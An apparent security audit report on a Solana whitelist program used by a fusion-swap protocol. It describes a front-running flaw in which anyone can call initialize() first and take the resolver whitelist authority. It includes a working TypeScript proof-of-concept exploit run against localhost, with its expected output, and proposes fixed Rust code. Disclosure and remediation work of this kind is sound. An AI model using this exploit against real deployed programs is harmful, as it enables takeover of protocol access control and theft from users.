# Audit Report

## Title
**Critical PDA Front-Running Vulnerability in Whitelist Initialization Enables Complete Protocol Access Control Takeover**

## Summary
The whitelist program's `initialize()` function uses a predictable PDA derivation with only a constant seed and lacks authorization constraints, allowing any attacker to front-run the legitimate initialization transaction and permanently seize control of the resolver whitelist system.

## Finding Description

The whitelist program contains a critical initialization vulnerability that violates both the **PDA Security** and **Access Control** invariants. The vulnerability stems from three design flaws working in combination:

**1. Predictable PDA Derivation**

The `whitelist_state` PDA is derived using only a constant string seed without any dynamic components: [1](#0-0) [2](#0-1) 

The PDA can be computed by anyone using:
```
PublicKey.findProgramAddressSync([b"whitelist_state"], program_id)
```

**2. No Authorization Constraints**

The `initialize()` function accepts any signer and sets them as the authority without validation: [3](#0-2) [4](#0-3) 

**3. One-Time Initialization Lock**

The `init` constraint prevents re-initialization once the account exists, making the attack permanent.

**Attack Execution Path:**

1. Attacker observes whitelist program deployment at address `5jzZhrzqkbdwp5d3J1XbmaXMRnqeXimM1mDMoGHyvR7S`
2. Attacker computes the predictable `whitelist_state` PDA address using the utility function pattern: [5](#0-4) 

3. Attacker submits `initialize()` transaction with their own keypair as signer, paying high priority fees to ensure transaction ordering
4. Attacker's transaction executes first, setting `whitelist_state.authority` to attacker's public key
5. Legitimate 1inch initialization transaction fails (account already initialized)
6. Attacker now controls the `register()` and `deregister()` functions, which are protected by authority checks: [6](#0-5) 

**Impact on Protocol Security:**

The whitelist controls which resolvers can execute critical fusion-swap operations. The `Fill` instruction requires a valid `resolver_access` account: [7](#0-6) 

Similarly, the `CancelByResolver` instruction requires resolver access: [8](#0-7) 

With whitelist control, an attacker can:
- Register malicious resolvers to fill orders at unfavorable prices
- Prevent legitimate resolvers from being registered
- Deregister existing resolvers to disrupt protocol operations
- Effectively control the entire order execution system

## Impact Explanation

**Severity: CRITICAL**

This vulnerability enables **complete protocol compromise** meeting the critical severity criteria:

1. **Total Access Control Takeover**: The attacker gains permanent authority over the whitelist system, controlling which resolvers can interact with the protocol
2. **Irreversible Without Redeployment**: Once exploited, the only recovery is redeploying both programs with new program IDs, requiring coordination across all users and integrations
3. **Protocol-Wide Impact**: Affects all users of the fusion-swap protocol, as order filling and cancellation depend on authorized resolvers
4. **Economic Exploitation**: Attacker-controlled resolvers can manipulate order execution to extract value from all orders
5. **Permanent Lock-Out**: Legitimate protocol administrators are permanently prevented from managing resolver access

The vulnerability breaks multiple critical invariants:
- **Access Control**: Unauthorized actor controls who can fill/cancel orders
- **PDA Security**: PDA collision through predictable seed derivation enables account takeover
- **Escrow Integrity**: Compromised resolver authorization can lead to improper escrow resolution

## Likelihood Explanation

**Likelihood: HIGH**

The attack is highly likely to occur because:

1. **Zero Technical Barriers**: Any user can compute the PDA address and call `initialize()` - no special permissions or complex exploit required
2. **Public Information**: Program ID is publicly visible on-chain immediately after deployment
3. **Economic Incentive**: Complete control over a DeFi protocol's order execution provides massive financial incentive
4. **Transaction Ordering**: Attacker can use priority fees to ensure their transaction processes first
5. **Visible Window**: The gap between program deployment and legitimate initialization creates an obvious attack window
6. **No Detection Possible**: Until the legitimate team attempts initialization, they won't know the attack occurred
7. **Standard Pattern Recognition**: Attackers routinely monitor for program deployments to exploit initialization vulnerabilities

This is a well-known vulnerability class in Solana programs, and sophisticated attackers actively monitor for such patterns.

## Recommendation

**Immediate Fix: Add Authority Constraint to PDA Seeds**

The PDA derivation must include a dynamic component that only the legitimate authority can provide. The recommended approach is to include the upgrade authority's address in the PDA seeds:

```rust
// Modified lib.rs

// Add a new constant for an admin seed
pub const ADMIN_SEED: &[u8] = b"admin";

#[derive(Accounts)]
#[instruction(admin: Pubkey)]  // Pass expected admin as instruction parameter
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED, admin.as_ref()],  // Include admin in seeds
        bump,
        // Ensure the authority matches the admin
        constraint = authority.key() == admin @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}

pub fn initialize(ctx: Context<Initialize>, admin: Pubkey) -> Result<()> {
    let whitelist_state = &mut ctx.accounts.whitelist_state;
    whitelist_state.authority = admin;
    Ok(())
}
```

**Alternative Fix: Use Program Upgrade Authority**

Leverage Solana's program upgrade authority as the seed:

```rust
#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    /// The program's upgrade authority
    /// CHECK: Verified through program data account
    pub upgrade_authority: UncheckedAccount<'info>,
    
    /// The program data account
    /// CHECK: PDA of the BPF Upgradeable Loader
    #[account(
        constraint = program_data.upgrade_authority_address == Some(upgrade_authority.key())
    )]
    pub program_data: UncheckedAccount<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED, upgrade_authority.key().as_ref()],
        bump,
        constraint = authority.key() == upgrade_authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}
```

**Additional Hardening:**
1. Document the expected initialization authority address before deployment
2. Initialize immediately after deployment in the same transaction if possible
3. Monitor for initialization events and verify the authority address
4. Implement multi-sig for authority operations to reduce single-point-of-failure risk

## Proof of Concept

```typescript
import {
  Connection,
  Keypair,
  PublicKey,
  Transaction,
  sendAndConfirmTransaction,
} from "@solana/web3.js";
import { Program, AnchorProvider } from "@coral-xyz/anchor";
import { Whitelist } from "../target/types/whitelist";

/**
 * Proof of Concept: Front-Running Whitelist Initialization
 * 
 * This PoC demonstrates how an attacker can front-run the legitimate
 * initialization and seize control of the whitelist.
 */

async function exploitFrontRunning() {
  // Setup
  const connection = new Connection("http://localhost:8899", "confirmed");
  const attackerKeypair = Keypair.generate();
  const legitimateAdminKeypair = Keypair.generate();
  
  // Fund the attacker
  const airdropSig = await connection.requestAirdrop(
    attackerKeypair.publicKey,
    2_000_000_000
  );
  await connection.confirmTransaction(airdropSig);
  
  const provider = new AnchorProvider(
    connection,
    { publicKey: attackerKeypair.publicKey } as any,
    {}
  );
  const program = new Program<Whitelist>(IDL, provider);
  
  // Step 1: Attacker computes the predictable PDA
  const [whitelistStatePDA] = PublicKey.findProgramAddressSync(
    [Buffer.from("whitelist_state")],
    program.programId
  );
  
  console.log("Computed whitelist_state PDA:", whitelistStatePDA.toString());
  
  // Step 2: Attacker calls initialize() with their own authority
  const attackTx = await program.methods
    .initialize()
    .accounts({
      authority: attackerKeypair.publicKey,
      whitelistState: whitelistStatePDA,
    })
    .signers([attackerKeypair])
    .rpc({ commitment: "confirmed" });
    
  console.log("✅ Attacker successfully initialized with tx:", attackTx);
  
  // Step 3: Fetch the whitelist state to verify attacker control
  const whitelistState = await program.account.whitelistState.fetch(
    whitelistStatePDA
  );
  
  console.log("Current authority:", whitelistState.authority.toString());
  console.log("Attacker address:", attackerKeypair.publicKey.toString());
  console.assert(
    whitelistState.authority.equals(attackerKeypair.publicKey),
    "Attacker should be the authority"
  );
  
  // Step 4: Legitimate admin tries to initialize - THIS WILL FAIL
  try {
    await program.methods
      .initialize()
      .accounts({
        authority: legitimateAdminKeypair.publicKey,
        whitelistState: whitelistStatePDA,
      })
      .signers([legitimateAdminKeypair])
      .rpc();
      
    console.log("❌ This should not execute - init should fail");
  } catch (error) {
    console.log("✅ Legitimate admin initialization failed as expected");
    console.log("Error:", error.message);
  }
  
  // Step 5: Attacker can now register malicious resolvers
  const maliciousResolver = Keypair.generate();
  const [resolverAccessPDA] = PublicKey.findProgramAddressSync(
    [Buffer.from("resolver_access"), maliciousResolver.publicKey.toBuffer()],
    program.programId
  );
  
  await program.methods
    .register(maliciousResolver.publicKey)
    .accounts({
      authority: attackerKeypair.publicKey,
      whitelistState: whitelistStatePDA,
      resolverAccess: resolverAccessPDA,
    })
    .signers([attackerKeypair])
    .rpc();
    
  console.log("✅ Attacker registered malicious resolver:", maliciousResolver.publicKey.toString());
  
  // Step 6: Legitimate admin cannot register resolvers
  const legitimateResolver = Keypair.generate();
  const [legit_resolverAccessPDA] = PublicKey.findProgramAddressSync(
    [Buffer.from("resolver_access"), legitimateResolver.publicKey.toBuffer()],
    program.programId
  );
  
  try {
    await program.methods
      .register(legitimateResolver.publicKey)
      .accounts({
        authority: legitimateAdminKeypair.publicKey,
        whitelistState: whitelistStatePDA,
        resolverAccess: legit_resolverAccessPDA,
      })
      .signers([legitimateAdminKeypair])
      .rpc();
      
    console.log("❌ This should not execute");
  } catch (error) {
    console.log("✅ Legitimate admin cannot register resolvers - Unauthorized error expected");
  }
  
  console.log("\n🚨 EXPLOIT SUCCESSFUL:");
  console.log("- Attacker controls the whitelist authority");
  console.log("- Legitimate administrators are permanently locked out");
  console.log("- Only recovery: redeploy program with new ID");
}

exploitFrontRunning();
```

**Reproduction Steps:**

1. Deploy the whitelist program to a test network
2. Before the legitimate team initializes, run the attacker script
3. Observe that the attacker becomes the authority
4. Attempt legitimate initialization - it will fail with "account already initialized"
5. Verify that only the attacker can register/deregister resolvers
6. Confirm that the fusion-swap program only accepts resolvers registered by the attacker

**Expected Output:**
```
Computed whitelist_state PDA: <PDA_ADDRESS>
✅ Attacker successfully initialized with tx: <TX_SIGNATURE>
Current authority: <ATTACKER_PUBKEY>
Attacker address: <ATTACKER_PUBKEY>
✅ Legitimate admin initialization failed as expected
Error: failed to send transaction: Transaction simulation failed: Error processing Instruction 0: custom program error: 0x0
✅ Attacker registered malicious resolver: <MALICIOUS_RESOLVER_PUBKEY>
✅ Legitimate admin cannot register resolvers - Unauthorized error expected

🚨 EXPLOIT SUCCESSFUL:
- Attacker controls the whitelist authority
- Legitimate administrators are permanently locked out
- Only recovery: redeploy program with new ID
```

---

## Notes

This vulnerability represents a fundamental flaw in the program's initialization security model. The use of a globally predictable PDA without authorization constraints is a well-documented anti-pattern in Solana development. The issue is exacerbated by the critical role the whitelist plays in the protocol's security - it controls the entire resolver access system that governs order execution.

The vulnerability requires immediate remediation before mainnet deployment. If already deployed, the protocol team should:
1. Alert users immediately
2. Pause protocol operations if possible
3. Prepare for full program redeployment with the fixed implementation
4. Coordinate with all integrators for the migration

The recommended fix using the upgrade authority or a pre-committed admin address in the PDA seeds is a standard pattern used by major Solana protocols and should be adopted immediately.

### Citations

**File:** programs/whitelist/src/lib.rs (L9-9)
```rust
pub const WHITELIST_STATE_SEED: &[u8] = b"whitelist_state";
```

**File:** programs/whitelist/src/lib.rs (L18-22)
```rust
    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        let whitelist_state = &mut ctx.accounts.whitelist_state;
        whitelist_state.authority = ctx.accounts.authority.key();
        Ok(())
    }
```

**File:** programs/whitelist/src/lib.rs (L43-58)
```rust
#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L66-71)
```rust
    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can register new users
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
```

**File:** scripts/utils.ts (L126-133)
```typescript
export function findWhitelistStateAddress(programId: PublicKey): PublicKey {
  const [whitelistState] = PublicKey.findProgramAddressSync(
    [anchor.utils.bytes.utf8.encode("whitelist_state")],
    programId
  );

  return whitelistState;
}
```

**File:** programs/fusion-swap/src/lib.rs (L511-516)
```rust
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, taker.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```

**File:** programs/fusion-swap/src/lib.rs (L648-653)
```rust
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, resolver.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```
